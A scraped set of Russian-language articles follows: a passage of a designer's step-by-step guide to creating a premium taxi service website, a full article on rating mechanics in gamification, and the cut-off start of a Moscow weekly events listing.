занимаюсь развитием стартапа в сфере логистики и совсем недавно моей основной задачей (помимо тестирования еженедельных релизов) было создание корпоративного сайта. Чтобы далеко не уходить от темы, я выберу транспортную сферу, а точнее - сайт сервиса по заказу такси премиум класса.\n\nДизайн-процесс\r\nВариаций возможных дизайн-процессов в интернете много, поэтому я остановлюсь на классическом варианте, который использую сам:\n\n\nПогружение в задачу\nИсследование\nПродумывание сценариев\nСоздание фреймворка\nПоиск визуального стиля\nДизайн макетов\n\r\nПрежде чем приступить, хочу отметить, что дизайн-процесс - это не строгая последовательность действий. Вполне возможно, что вам несколько раз придется возвращаться на предыдущие этапы, а, может, некоторые этапы и вовсе перемешаются друг с другом.\n\r\nОриентируйтесь на описанный процесс, но не будьте его заложником.\n\n1) Погружение в задачу или на чем зарабатывает бизнес\r\nПервое, что нужно сделать - это разобраться каким образом бизнес клиента зарабатывает деньги. Такси зарабатывает на комиссии с каждой перевозки, поэтому дизайн должен вести пользователя к созданию заказа.\n\r\nМне сразу же пришла идея повесить на первый экран сайта форму заказа такси. Благодаря этому, сайт будет не только информационным порталом, но и полноценным сервисом.\n\nКак видите, пытаясь разобраться в бизнесе заказчика, в голову будут приходить идеи. Сразу же фиксируйте их, иначе забудете. При продумывании структуры сайта, они вам сильно пригодятся. В текущем проекте мы используем Confluence. Для небольших проектов я бы выбрал Apple Notes или что-то подобное.\n\r\nНо, постойте-ка. Часто ли мы заказываем такси с сайта? Быть может, нам нужно акцентировать внимание не на онлайн-заказе такси, а на скачивании приложения? Хм, хороший вопрос. Давайте занесем наши идеи в заметки и продолжим изучать бизнес.\n\r\nЛучший способ разобраться в бизнесе - это обратиться к заказчику. Помимо того, что вы сэкономите уйму времени, вам удастся вовлечь клиента в процесс работы, показав, что итоговый результат - это не результат сиюминутного вдохновения, а комбинации правильно подобранного визуального стиля и бизнес–логики.\n\nИтог этапа:\n\r\nВы должны четко понимать, каким образом бизнес заказчика зарабатывает и к какому ключевому действию вы должны привести пользователя. В нашем случае задача - убедить посетителя сайта скачать приложение.\n\n2) Исследование и анализ конкурентов\r\nЭтот этап проще всего начать с изучения конкурентов, а после подключить к нему схожие по механике сервисы.\n\r\nДавайте подумаем, какова механика заказа такси. Во-первых, у нас есть человек, который хочет переместиться из одного места в другое. Во-вторых, у нас есть водитель, который готов выполнить это задание. Какие сервисы работают по схожей логике?\n\r\nМне приходит в голову AirBnB, где один человек хочет арендовать жилье, а другой готов его сдать. Или фрилансерские ресурсы, например, UpWork, где заказчику нужно выполнить какую-либо работу, для чего ему нужен исполнитель.\n\n\n\r\nНу и конечно, нужно посмотреть сайты прямых конкурентов: Gett, Яндекс.Такси, Ситимобил, InDriver, и конечно же Wheely.\n\r\nПросматривая эти сайты, старайтесь отмечать схожие и различающиеся детали. Например, Wheely предлагает с ходу скачать приложение, отправив на номер телефона смс, а Яндекс.Такси предлагает прямо с сайта сделать заказ.\n\r\nЕсть еще одна деталь с которой я сталкиваюсь уже на втором проекте подряд. Как мы говорили, у нас есть два типа пользователей - пассажир и водитель. Для обеих ролей нужна отдельная страница, так как их привлечение будет идти по разным каналам. Кому же в этом случае отдать главную страницу? Или может стоит сделать одну разводящую?\n\r\nПроанализировав популярные сервисы, я заметил одну деталь. Почти все компании со схожей механикой, отдают главную страницу под тех пользователей, которые платят деньги.\n\r\nТо есть, у AirBnB главная отдана под путешественников, а страница владельцев жилья спрятана в меню (деньги сервису платят постояльцы). Qlean, Wheely, UpWork и многие другие сервисы используют ту же стратегию, поэтому, и в нашем проекте я бы остановился на ней. То есть, главную страницу отдал бы под пассажиров (которые платят сервису), а в меню добавил страницу «стать водителем».\n\r\nНа этом этапе я бы начал изучать, какие сущности используют сайты конкурентов, чтобы в конце исследования выбрать лучшую структуру, которая подходит под ваш тип бизнеса. Вот сущности с сайта Wheely: скачивание приложения, о водителях, об автомобилях, страховка, скачивание приложения, отзывы.\n\r\nПроанализировав таким образом несколько сайтов, вы начнете лучше разбираться в сфере заказчика и подбирать сущности, подходящие вашему проекту. \n\r\nНапример, рассказ о новых машинах больше подходит премиальному сегменту, тогда как сервисам, предлагающим эконом-класс, лучше про качество автомобилей промолчать, сделав акцент на выгодной цене. В такси бизнес-класса цена не столь важна, поэтому ее открыто показывать не стоит. Представьте, как будет странно смотреться преимущество «выгодная цена», когда твой сервис используют миллионеры.\n\nИтог этапа:\n\r\nВы проанализировали 5+ схожих сервисов и выписали какие сущности используют конкуренты. В идеале, вы должны пройтись по ключевому сценарию в каждом сервисе, чтобы отделить хорошие идеи от тех, которые вызывают затруднение.\n\n3) Продумывание сценариев или создание Customer Journey Map\r\nДизайнер должен думать в рамках сценариев, а не экранов. Не важно, сколько у вас экранов, важно лишь насколько удобно пользователю решать свои задачи, используя ваш сервис.\r\nЧисто логически кажется, что удобнее все делать в рамках одного экрана, но дизайнеры знают, что длинные формы лучше разбивать на несколько шагов. В дизайне нет фундаментальных правил, все всегда зависит от задачи.\n\r\nВ своей практике я использую Customer Journey Map для продумывания сценариев. Суть его работы я уже описывал в Telegram-канале The Design Times:\n\nCJM представляет собой таблицу, по вертикали (столбцы) которой̆ располагаются шаги, которые необходимо пройти пользователю до цели. Например, при покупке билетов на сайте авиакомпании столбцы вашей таблицы выглядели бы примерно так: сайт, заполнение формы (откуда, куда, кто и когда), поиск подходящего рейса, просмотр подробностей, оплата.\n\r\nПо горизонтали (строки) располагается следующее:\n\nЦель пользователя\r\nВ данном случае, под целью пользователя имеется не глобальная цель (купить билеты), а локальная на данном этапе, например, заполнить форму или подобрать подходящий рейс.\n\nКлючевое действие\r\nИсходя из цели, можно определить ключевое действие. На этапе заполнение формы это будет переход к списку рейсов по выбранным параметрам.\n\nНастроение\r\nЗдесь нужно определить, что чувствует пользователь на каждом этапе и постараться избежать недовольства или замешательства. Если несколько этапов подряд идут негативные эмоции, высока вероятность, что пользователь не продолжит работать с сервисом.\n\nВозможные проблемы\r\nЧрезвычайно важный этап, над которым стоит хорошо подумать. Он может включать в себя, как ошибки от невнимательности, так и непонимание интерфейса.\n\nРешения\r\nЭтот этап тесно связан с предыдущим. На каждую проблему нужно найти 1–2 решения. Обычно, после выявления возможных проблем, решения становятся очевидными. Именно поэтому CJM сильно помогает в проектировании интерфейсов.\n\r\nМногие думают, что успех проекта решает только опыт, поэтому недооценивают важность процесса. Использование CJM помогает минимизировать недостаток опыта за счет продуманной последовательности действий.\n\r\nСоставление CJM отнимает достаточно времени, но не нужно забывать, что это тоже дизайн. Возможно, это даже больше дизайн, чем то, что мы делаем в графическом редакторе.\n\r\nПоследняя часть очень важная. Начинающие дизайнеры всегда пренебрегают аналитическим этапом, сразу же приступая к рисованию. Так же делал и я на старте, но, после того, как начал использовать описанный процесс, мои проекты стали более продуманными.\n\r\nВ данном случае, сценарий у нас будет небольшой (сайт → приложение), но даже на нем у пользователя могут возникнуть проблемы. \n\r\nНапример, он может не проявить к вашему сервису доверие (добавить отзывы, гарантию?), внешний вид сайта не будет выглядеть премиальным (изменить визуальный стиль?), код смс не придет (сделать повторную отправку, добавить онлайн-поддержку?), …\n\nИтог этапа:\n\r\nВы должны понимать, какие проблемы могут возникнуть на пути пользователя и придумать несколько вариантов решений, которые позволят их избежать.\n\n4) Создание фреймворка\r\nФреймворк - это структура, вокруг которой строятся элементы интерфейса. Например, в почтовом сервисе Gmail есть верхняя строка поиска, левое меню и правая часть, отданная под письма. Подобная структура - и есть фреймворк.\n\r\nДизайнеры существуют потому, что нет универсального фреймворка. Каждому сервису нужен свой. Конечно, есть верхнеуровневые правила дизайна, но чуть углубившись вам необходимо придумывать свои решения, иначе пользователь будет решать свои задачи не оптимальным образом. Это как крутить педали руками. Передвижение есть, но не столь эффективное, если бы вы использовали ноги.\n\r\nВ случае с сайтом, фреймворк - это последовательные блоки, собранные из выписанных сущностей на этапе исследования. Если ваш бизнес уникален, то придется придумывать что-либо свое, но, как показывает практика, у большинства компаний есть несколько прямых конкурентов, опыт которых можно перенять.\n\r\n***\n\r\nЧто делает посетитель, попадая на сайт? Если сервис ему знаком, то он сразу переходит к регистрации или входу. Если же нет, то ему будет интересно проглядеть всю главную страницу в поисках логического и эмоционального подтверждения. Чтобы пользователь, изучив всю страницу, не потерял форму скачивания приложения, ее лучше продублировать внизу.\n\r\nДавайте вспомним структуру сайта Wheely: скачивание приложения, о водителях, об автомобилях, страховка, скачивание приложения, отзывы. \n\r\nКак видите, в начале и конце страницы ключевые действия повторяются, чтобы посетитель сайта, проглядев все блоки, не ушел. Это правило подходит всем.\n\r\nОсновные блоки сайта нужно выбирать под тип нашего проекта. Сервису заказа такси бизнес-класса нужно показать статус и отличия от обычных сервисов. Wheely это делает, используя фотографию водителя в костюме и списка особенностей, как встреча с зонтом во время дождя. Если в вашем сервисе нет других особенностей, вы можете использовать структуру конкурентов. Но зачастую, прямые конкуренты появляются с какими-либо особенностями, на которых и необходимо сделать акцент.\n\r\nДопустим, что ваш сервис нанимает только водителей девушек. В этом случае, вам нужно это показать, используя фотографии и описать причины, почему водители девушки - это оптимальный вариант (контент обычно предоставляет заказчик).\n\r\nПодобным сервисам никогда не помешают отзывы известных людей и ссылки на публикации популярных СМИ. Это повышает доверие, которое в эпоху интернета очень важно.\n\r\nЧтобы добавить наглядности, продемонстрируйте блок со скриншотом приложения и описанием его основных функций. Не надейтесь, что к нему будут сильно приглядываться, но его наличие повысит доверие.\n\r\nЧтобы определить требуемую структуру сайта, достаточно выписать все сущности, которые используют конкуренты и отобрать те, которые наиболее подходят вашему бизнесу, слегка трансформировав их под свои задачи.\n\r\nНабравшись компетенций в определенной сфере, этот этап вам не придется проходить каждый раз заново и вы сможете использовать свои наработки, периодически поддерживая их актуальность. Именно поэтому, дизайнеру и студии выгодно специализироваться на какой-либо сфере.\n\nИтог этапа:\n\r\nВы должны понимать, какие сущности (блоки) будете использовать и в какой последовательности. Лучше, если это будет оформлено в виде зарисовок на бумаге или в текстовом документе.\n\n5) Поиск визуального стиля\r\nОб этом этапе я написал отдельный материал и ключевая его идея в следующем:\n\r\nГлавное, что нужно понять - это что визуальный стиль должен соответствовать посылу бренда. Это основной критерий вашей работы. Стиль может быть модным, скучным, футуристичным или любым другим, это - вообще не важно. Важно лишь, чтобы он пробуждал нужные эмоции.\n\r\nКакие эмоции должен пробуждать сайт сервиса по заказу такси бизнес класса? Логично, что он должен показывать высокий уровень качества и премиальность услуги. Этого можно добиться несколькими способами.\n\r\nПервое  –  это цвет. Если посмотреть на премиальные бренды, то они преимущественно используют черный или золотой цвета. Это не догма, тем более наш основной конкурент Wheely уже использует черный. Поэтому, чтобы выделиться нужно выбрать что-то другое. Например, добавив дополнительный цвет (золотой, желтый?) или выбрав в качестве основного красный. Неожиданное решение, но оно может сработать. Например, Virgin Atlantic использует красный, несмотря на то, что предоставляет услуги бизнес-класса.\n\r\nВторое –  это изображения. Заходя на сайт, вы сразу же видите действие - открывание двери черного Mercedes, благодаря чему сайт наводит посетителя на нужные эмоции.\n\n\n\r\nТретье –  это инфографика. Порой, дизайнеры берут первые попавшиеся иконки, не задумываясь какой визуальный посыл они несут. Посмотрите какие возможности по кастомизации иконок предлагает Google. Там вы можете настроить стиль иконок и выбрать наиболее подходящие. Разнообразие стилей можно посмотреть на flaticon.com. Основные параметры, с которыми можно экспериментировать - это цветные или ч/б, залитые или контурные, закругленные или нет.\n\nИтог этапа:\n\r\nВы должны определить, какой посыл должен нести ваш проект и подобрать под него цвета, стиль изображений, иконки (или обойтись без них) и шрифт.\n\n6) Дизайн макетов\r\nОпределившись со структурой и визуальным стилем, можете переходить к дизайну экранов. Тут мало что можно сказать, особенно когда речь идет о простом сайте. Вам нужно лишь перенести свои идеи в реальность.\n\r\nЕсли бы вы работали над большими сервисами, то начать следовало бы с экранов, которые входят в основной сценарий. На нем вы бы смогли отработать стиль, структуру и провести первую презентацию заказчику. В случае с сайтом нужно начать с главной страницы и отработать стиль на ней, а после уже масштабировать его на остальные страницы.\n\r\nОбычно, первые наброски сайта я делаю от руки и только после того, как определюсь со структурой, перехожу к графическому редактору (я уже полгода на Figma). Сделав 1–2 экрана я делаю паузу, а после пытаюсь найти недочеты. Таким образом, я продвигаюсь до футера, после чего, могу еще сделать несколько итераций по улучшению сайта.\n\nИтог этапа:\n\r\nДизайн необходимых макетов готов и прошел несколько итераций доработок.\n\r\n***\n\r\nВ этом материале, я показал процесс создания простого дизайн-проекта. Начинающие дизайнеры спокойно могут использовать его, как шаблон, дорабатывая под свои нужды и предпочтения. \n\r\nОписанный процесс лучше всего подходит для клиентской работы, так как в продуктовой он будет немного отличаться.\n\nВместо заключения\r\nГлавная вещь, которую нужно понимать - это то, что никакой материал не заменит практики. Только начав применять полученные знания в своей работе, можно рассчитывать на прогресс.\n\r\nВсе начинали с нуля и год за годом улучшали свое мастерство. Это очень простая, но, при этом, фундаментальная вещь в достижении значимых результатов в любой сфере.\n\r\nСмотрите на свою карьеру стратегически и пусть каждый рабочий день будет новой ступенью к достижению ваших профессиональных целей.", {"day": "31", "month": "октября", "time": "16:47"}, {"rate": 12, "views": 11000}], ["Рейтинг. Что это и как его использовать в геймификации? Вопрос кажется простым, даже риторическим, но на деле и у такой очевидной механики есть много нюансов, в том числе, обусловленных эволюцией человека.\n\n\n\r\nЭта статья — первая из моего цикла статей о компонентах, механиках и интересных примерах геймификации. Поэтому некоторым общим терминам я буду давать краткие определения. Что такое “геймификация (игрофикация)”? Википедия дает определение: “применение для прикладного программного обеспечения и веб-сайтов подходов, характерных для компьютерных игр, в неигровых процессах с целью привлечения пользователей и потребителей, повышения их вовлеченности в решение прикладных задач, использование продуктов, услуг”. \n\r\nПредпочитаю другой вариант: “геймификация — управление поведением пользователей системы с помощью игровых механик”. Разница между этими определениями в том, что системой может быть как веб-сайт или ПО, так и общественный парк или транспортная сеть. Геймификация применима не только в ИТ-сфере. Далее, некоторые игровые механики используются для повышения вовлеченности пользователей, некоторые — для привлечения пользователей, но это объединяется в обобщенное понятие “управление поведением”. Для внедрения геймификации важно знать, что пользователи в системе делают (могут делать, если система еще не используется), и что пользователи должны делать с точки зрения владельцев системы. Геймификация полезна для перехода от “делают” к “должны делать”. \n\n\r\nРейтинг — простая и популярная игровая механика, используемая в геймификации. Точного определения термина “игровая механика” нет, порою под ним понимают что угодно — от баджей и ачивментов до поведенческих импульсов. Наведение порядка в используемой в геймификации терминологии — тема для отдельной статьи, здесь же ограничусь кратким объяснением, что я понимаю под игровой механикой. Это низший (наиболее конкретный) уровень проектирования геймифицированной системы, условные кубики конструктора Lego. Игровые механики выбираются и применяются тогда, когда верхние, более абстрактные уровни геймификации системы уже продуманы. Поэтому рейтинг, баджи, уровни — игровые механики, а вирусность или групповая работа — нет. \n\r\nРейтинг — числовой или порядковый показатель, отображающий важность или значимость определенного объекта или явления (определение из Википедии). Механика рейтинга связана с механикой очков и часто — с механикой уровней пользователя. Рейтинг без очков невозможен — система не поймет, в каком порядке отображать пользователей в рейтинге, рейтинг без уровней возможен.\n\r\nПопробуем классифицировать рейтинги по значению для пользователей системы. \n\n\nСоревновательный — побуждает пользователей быть выше в рейтинге чем другие пользователи. Чаще остальных встречающийся рейтинг.\nОпределение проигрышной ситуации — система накладывает штраф, если заданное количество очков рейтинга не набрано. Возможные варианты штрафа: перевод в предыдущую группу рейтинга, снижение ранга, поражение в соревновании, списание какого-то количества игровой валюты, моральный штраф (доска позора). Используется реже, чем аналог с выигрышной ситуацией, требует тщательного продумывания перед внедрением и анализа поведения пользователей, потому что штрафы оказывают слишком негативное воздействие на пользователя и могут сильно снизить мотивацию.\nОпределение выигрышной ситуации — дает право на награду за достижение заданного количества очков рейтинга. За первые места в рейтинге, за промежуточные этапы. В качестве наградой используются те же варианты, что и в штрафах в проигрышной ситуации, но со знаком “плюс”. Награды за промежуточные этапы в рейтинге — интересная, но редкая практика, которая позволяет пользователю медленнее терять энтузиазм в процессе перехода от уровня к уровню. Пример — рейтинг старой версии Шефмаркета. Это сервис доставки на дом продуктов с рецептами для самостоятельного приготовления. У каждого клиента в личном кабинете отображается статус, за приготовленные блюда начисляются баллы, за баллы дают уровни, но для достижения очередного уровня нужно приготовить десятки блюд, и это может демотивировать. Смягчить демотивирующий эффект помогают подарки за каждые Х очков (количество очков зависит от текущего уровня клиента). \nРейтинг пользователя Шефмаркета.Обратите внимание, как органично используются другие гейм-механики: баджи, прогресс-бар, звания, упакованые в приятный глазу интерфейс.\nСтатусный — повышает авторитет пользователя с высоким рейтингом в глазах других пользователей. Используется, например, в проектах онлайн-вопросов (StackOverflow, Ответы@Mail.Ru). Системы MMR (рейтинги подбора игроков) в MOBA-играх тоже можно отнести к статусному рейтингу.\nДоверительный — повышает доверие к пользователю с высоким рейтингом в глазах других пользователей. Стал стандартом для интернет-аукционов. Карма пользователей Хабра — еще один пример доверительного рейтинга. Доверительный рейтинг используется в системах, основанных на взаимодействии пользователей друг с другом, особенно, если это взаимодействие в оффлайне или подразумевает обмен услугами и товарами. \nПример рейтинга интернет-аукциона с баджами, выдаваемыми при достижении определенного уровня рейтинга.\n\r\nРейтинги из списка выше комбинируются разными способами внутри системы. В теории возможен соревновательный рейтинг пользователей, с промежуточными выигрышными ситуациями, со штрафом аутсайдеров рейтинга и высоким уровнем статуса и доверия для лидеров рейтинга.\n\r\nЕще один вариант классификации рейтингов: по тому, кто изменяет рейтинг пользователя — только система, только другие пользователи или система и пользователи. Вариант, когда только система изменяет рейтинг пользователя, наиболее распространен. Он часто используется в онлайн-играх. Игрок выполняет различные действия (убивает монстров, выполняет квесты), за это система начисляет очки опыта (рейтинга). Другие пользователи не влияют на рейтинг игрока в такой системе. Вариант, когда рейтинг пользователя изменяет не система, а другие пользователи системы, обычно используется вместе с доверительным рейтингом. Примеры: повышение или понижение кармы, положительные и отрицательные отзывы после сделок на торговых площадках. Возможен и комбинированный вариант, например в онлайн-вопросах. За ответ на вопрос пользователь автоматически получает баллы рейтинга от системы, а если другие пользователи признают ответ лучшим, то пользователь получает дополнительные баллы. \n\r\nСледующий способ основан на положительном и отрицательном изменении рейтинга пользователя. Я выделяю условные “рейтинг плюс”, “рейтинг плюс-минус положительный”, “рейтинг плюс-минус отрицательный” и “рейтинг минус”. Первый вариант, “рейтинг плюс”, подразумевает только увеличение рейтинга пользователя. Такой вариант используется, например, для покупателей на аукционе eBay. По итогам сделки продавец оставляет покупателю только положительный отзыв или не оставляет его вовсе. Да, покупатель-мошенник может быть заблокирован администрацией, но его рейтинг снизиться не может (пока не станет сам плохо продавать).\n\r\nРейтинг плюс-минус положительный подразумевает как увеличение, так и уменьшение рейтинга пользователя, при этом рейтинг не падает ниже нуля. Такой рейтинг не позволит пользователю в случае неудачных действий упасть слишком глубоко (и познать мощь разгневанного Хабра). Но при этом новый пользователь и пользователь, рейтинг которого постоянно колеблется в околонулевой отметке из-за систематических “плохих” действий будут визуально выглядеть одинаково, что плохо влияет на доверие ко всей системе.\n\r\nРейтинг плюс-минус отрицательный означает, что пользовательский рейтинг может как подняться, так и упасть до любых значений. На практике смысла в большом отрицательном рейтинге нет и рекомендуется вводить в системе пороговое отрицательное значение, после которого стоит применять штрафные меры для такого пользователя, вплоть до блокировки аккаунта. При этом важно подумать и о ситуации намеренного “слива” рейтинга другими пользователями, исключить эту возможность или сделать трудно осуществимой. \n\n\r\nРейтинг минус — редко используемая механика, при которой изначальный рейтинг пользователя может либо не меняться, либо уменьшаться. Не вспомню сходу проекты, в которых используется подобная механика, но теоретически она возможна. Например, для проектов или игр на выбывание, или “последних героев”. \n\r\nПри использовании механики рейтинга нужно не допускать важной ошибки: разрывы в количестве набранных очков между пользователями системы (или между уровнями пользователя) не должны быть демотивирующими, недостижимыми. Особенно сильно такая разница демотивирует новых пользователей, которые видят, что у них ноль очков, а у лидера рейтинга — миллионы. Почему так происходит, почему новый пользователь в такой ситуации подумает, что невозможно догнать лидера? Во-первых, новые пользователи системы еще не успели провести достаточно времени, чтобы понять динамику набора очков. Два-три миллиона очков лидера рейтинга могут быть не так уж недостижимы, если за каждое действие пользователя система начисляет тысячи очков. Проблема в том, что демотивированный новый пользователь перестает пользоваться системой раньше, чем поймет это. Во-вторых, проблема в нашем природном логарифмическом восприятии числового ряда. \n\r\nМы привыкли жить среди линейного упорядочивания чисел. Нумерация домов, рулетки и линейки, графики и часы — везде числа расположены вдоль числовой прямой на равных интервалах. Нам очевидно, что разница между 1 и 5 и между 5 и 10 одинаковая. Такая же разница между 1 500 000 и 1 500 505. На деле, линейное упорядочивание чисел — результат воздействия нашей культуры, а не способность с рождения. Наши далекие предки, жившие десятки тысяч лет назад, не имели современного математического аппарата, а числа воспринимали логарифмически. То есть, располагали их на числовой прямой все теснее по мере возрастания. Они воспринимали числа не в терминах точных значений, а оценочно-приблизительно. Это было необходимо при их образе жизни. При встрече с врагами нужно было быстро, поэтому приблизительно, оценить, кого больше — своих или чужих. Выбор, с какого дерева собирать плоды, делался тоже на основе приблизительной оценки. Наши предки не высчитывали точные значения. Логарифмическая шкала также учитывает законы перспективы и наше восприятие расстояния. Например, если мы смотрим на дерево, находящееся на расстоянии ста метров, и на другое дерево, находящееся в 100 метрах позади первого, то вторые сто метров кажутся короче. \n\n \nИграющему белыми фигурами на этой картинке не нужно знать точное количество черных фигур, чтобы понять, что его дела плохи.\n\r\nПодробнее о логарифмическом восприятии чисел, о проведенных исследованиях, подтверждающих эту теорию, и о других занимательных фактах из мира математики можно прочитать в научно-популярной книге Алекса Беллоса “Алекс в стране чисел. Необычайное путешествие в волшебный мир математики”. \n\r\nЛогарифмическое восприятие чисел на интуитивном уровне перешло по наследству и к нам. Скрытое под культурным слоем, оно проявляет себя, например, в чувстве времени (в детстве годы проходили медленно, а сейчас просто летят). Мы по-прежнему, несмотря на все образование, теряемся при очень больших числах и инстинктивно переходим на их логарифмическое восприятие. Нам понятна разница между литром и двумя литрами пива, но что десять миллиардов, что сто миллиардов литров пива кажутся нам примерно одинаковыми числами, укладывающимися в понятие “очень-очень много пива”. Поэтому и возникает проблема ощущения недосягаемости рейтинга, если разрыв между текущей позицией и лидером составляет “очень-очень много” очков. Мозг пользователя не будет интуитивно заниматься анализом ситуации, изучать динамику накопления очков, рассчитывать время достижения вершины рейтинга. Он просто вынесет вердикт — “это очень много, не стоит тратить силы”. \n\r\nЧтобы избежать появления описанных выше ситуаций, нужно применять плавающую динамику начисления очков рейтинга, при которой пользователь получает поощрения и набирать очки рейтинга в начале предполагаемого жизненного цикла использования системы быстрее, чем в середине и конце. Пример — World of Warcraft и ему подобные MMORPG с “европейской” (а не “корейской”) системой прокачки персонажа. Условная европейская система прокачки подразумевает быстрое прохождение начальных уровней игры, с последующим постепенным замедлением. Система, используемая в типичных корейских (и других азиатских) играх, предполагает резкое замедление в скорости получения последних уровней персонажа.\n\r\nНапример, в Lineage 2 для достижения 74 уровня нужно набрать 500 000 опыта, для 75 уровня — 560 000, для 76 уровня — 623 000, для 77 уровня уже гораздо больше — 1 175 000, а для перехода с 84 уровня на максимальный 85 уровень понадобится набрать 270 миллионов опыта, при этом скорость набора опыта почти не изменяется (вся таблица опыта и уровней в Lineage 2 доступна по этой ссылке). Такое замедление видится излишним в геймификации, так как слишком демотивирует пользователей. \n\n\r\nЕще один момент, о котором стоит помнить — пользователю легче забросить игру или геймифицированную систему в начале, и сложнее, когда он провел в системе много времени, после которого пользователю будет жалко бросать накопленные очки, уровни, предметы. Поэтому давайте новым пользователям временный бонус к набранным очкам, например, +50% в течение месяца. Бонус послужит дополнительным стимулом использования системы, за время действия бонуса пользователь оценит скорость набора очков, освоится и с большей вероятностью продолжит пользоваться системой.\n\r\nПример ошибки демотивирующего разрыва в рейтинге — приложение Gett Taxi. До последнего обновления в программе лояльности было двадцать уровней, для максимального требовалось 6000 очков (за одну поездку давалось в среднем 20-30 очков). Все двадцать уровней были равномерно распределены по шкале от 0 до 6000, в примерном соответствии с европейской системой прокачки в онлайн-играх. После обновления в приложение добавили еще три уровня, в 10 000, 20 000 и 40 000 очков соответственно, что ближе к корейской системе (учитывая, что количество получаемых за поездку очков не изменилось). У меня нет репрезентативной выборки по мнениям пользователей приложения об этом обновлении, но восемнадцать моих друзей и коллег, которые пользуются Gett Taxi, отметили демотивирующий эффект новых уровней рейтинга. Никто из них за прошедшее с момента обновления время (больше года) так и не получил ни одного нового уровня. \n\n\nРазрыв между тремя новыми и предыдущими уровнями в программе лояльности Gett Taxi неоправданно большой и демотивирующий.\n\r\nЧтобы избежать демотивирующего разрыва в рейтинге, нужно, кроме глобального рейтинга, добавить в систему локальные рейтинги, у которых разрывы между позициями будут не так велики. \n\r\nВозможные способы деления глобального рейтинга на локальные:\n\n\nМежду друзьями. Показывает рейтинг, состоящий только из друзей пользователя. Люди любят соревноваться не с неизвестным соперником, о котором известен только никнейм (такой соперник мало чем отличается от бота), а с друзьями и знакомыми.\nПо времени. Рейтинг, набранный за определенное количество времени (день, неделя, месяц, год). Хорош обнулением и реиграбельностью. Не получилось победить на этой неделе — попробую на следующей, а отрыв пользователей друг от друга регулярно обнуляется и не вырастает до космических значений.\nПо геотаргетингу. Рейтинг, в котором показаны только пользователи из определенной области (район, город, страна, континент). Как раз в такой ситуации Гай Юлий Цезарь сказал, проезжая бедный варварский городок: “лучше быть первым здесь, чем вторым в Риме”.\nПо полу. Потом сравнивайте результаты мужчин и женщин, играя на хайповых феминистических и шовинистических мотивах (использовать осторожно, возможны потоки ненависти и фекалий с обеих сторон).\nПо возрастным группам. Например, в геймификации околоспортивных систем и систем, где требуются навыки, меняющиеся у человека с возрастом. Например, проекты, мотивирующие людей к занятиям спортом, позволяющие загружать свои результаты и видеть результаты других пользователей. Понятно, что человеку 65 лет будет гораздо сложнее пробежать столько же, сколько пробежал двадцатилетний, а соревноваться со своими сверстниками будет куда интереснее. Пример с другой стороны — онлайн-шахматы и иные сложные интеллектуальные игры, в которых опытный гроссмейстер будет недостижим для четырнадцатилетнего подростка.\nПо другим данным о пользователях, которые имеются в системе (рейтинг только для водителей Мерседесов, только для сантехников, только для юридического отдела, только для эльфов 120 уровня).\n\r\nКак угодно комбинируйте друг с другом перечисленные выше способы, не стесняйтесь с ними экспериментировать. \n\r\nВ ходе эксплуатации геймифицированной системы следите за тем, насколько рейтинг отвечает заданным при проектировании целям. Например, если целью рейтинга было увеличение доверия других пользователей к пользователям с высоким рейтингом, уделите внимание поиску и ограничению возможных честных и нечестных способов быстрого увеличения рейтинга. Основой доверительного рейтинга является сложность его получения и возможность очень быстро его утратить. Если в системе найдутся лазейки для неоправданно быстрого увеличения рейтинга, доверие к нему со стороны пользователей резко упадет. Например, если в интернет-аукционе будет возможность повышать рейтинг продавца за каждую проведенную сделку с каждым пользователем, то два пользователя могут поддерживать свой рейтинг на высоком уровне, просто покупая копеечные товары (в идеале — цифровые) друг у друга. При этом возможные негативные отзывы о некачественном сервисе или мошенничестве будут забиваться массой фейковых положительных отзывов, в результате возникает риск массовой утраты доверия к системе. \n\r\nВ завершение приведу еще три совета по использованию рейтинга и уровней:\n\n\nНе показывайте пользователю количество очков, нужное на последующих уровнях. Это деморализует новичков, еще не знающих скорости набора очков в системе и возможностей для набора очков. Когда пользователь видит, что первый уровень достигается за 10 очков, второй за 20, а двадцатый — уже за сто тысяч, это демотивирует. Сто тысяч кажется недостижимым числом.\nКоличество очков, необходимых до следующего уровня, показывайте с учетом набранных. Пользователь набрал 10 очков, перешел на второй уровень, и до достижения третьего уровня осталось 20 очков. Не показывайте прогресс пользователя как 0 из 20, лучше покажите как 10 из 30. Создавайте иллюзию незавершенной задачи, наш мозг не любит незавершенные задачи и стремится их закончить.Так работает механика прогресс-баров, этот принцип уместен и в нашем случае. Логарифмическое мышление тут тоже на руку. Когда мы видим, что набрали 450 из 500 очков опыта, нам кажется, что эта задача почти завершена.\nНапоминайте пользователю об успехах в различных рейтингах системы (ведь сам пользователь может и не догадываться, что на этой неделе он в тройке лидеров среди мужчин своего района).\n\r\nВ этой статье я не претендую на всеобъемлющий анализ возможных вариантов использования механики рейтинга, поэтому какие-то кейсы и варианты использования наверняка не упомянул. Если у вас есть интересный опыт использования рейтингов в играх и геймифицированных системах, поделитесь им со мной и другими читателями.", {"day": "31", "month": "октября", "time": "14:37"}, {"rate": 6, "views": 9800}], ["Подборка ключевых мероприятий в Москве на неделю.\n\nMoscow Design Week\n\n09 октября (вторник) — 14 октября (воскресенье)\nЦДХ, Крымский Вал 10\nбесплатно\nДизайн неделя соберет специалистов и архитекторов со всего мира. Они приедут, чтобы показать и обсудить свои работы, познакомиться с коллегами и обменяться опытом.\n\nПродвижение недвижимости в диджитал\n\n10 октября (среда)\nЛенинградский проспект 39c79\nбесплатно\nВысокая стоимость звонка и падающие продажи — ситуация, знакомая многим застройщикам. Как бороться, где искать ошибки и как их исправлять?\r\nОтветы на эти вопросы дадут спикеры митапа «Продвижение недвижимости в диджитал», который состоится 10 октября 2018 в Mail.ru Group. Эксперты портала МИР КВАРТИР, веб-бюро «Синий муравей», рекламной платформы myTarget и digital-агентства DD Planet расскажут:\r\nКакие ошибки совершают интернет-маркетологи застройщиков?\r\nКак найти баланс между ценой и качеством звонка?\r\nПочему инвестиции в разработку сайта часто не окупаются и как этого избежать?\r\nКак корректировать стратегии продвижения, чтобы успевать за аудиторией и рынком?\n\nТехнологический конкурс \"\"Газпром нефть\"\"\n\n10 октября (среда) — 30 октября (вторник)\nМГТУ им. Н.Э.Баумана, 2-я Бауманская 5c1\nбесплатно\nПредложи лучшую ИТ-идею для бизнеса и приходи работать в «Газпром нефть»!\r\nМы запускаем конкурс для программистов.\r\nСобери команду до 5 человек или участвуй самостоятельно.\r\nДо 10 октября регистрируйся по ссылке (https://goo.gl/forms/KorFnWn3HwuHWBVz1) на отборочный тур.\r\nПолучи тестовое 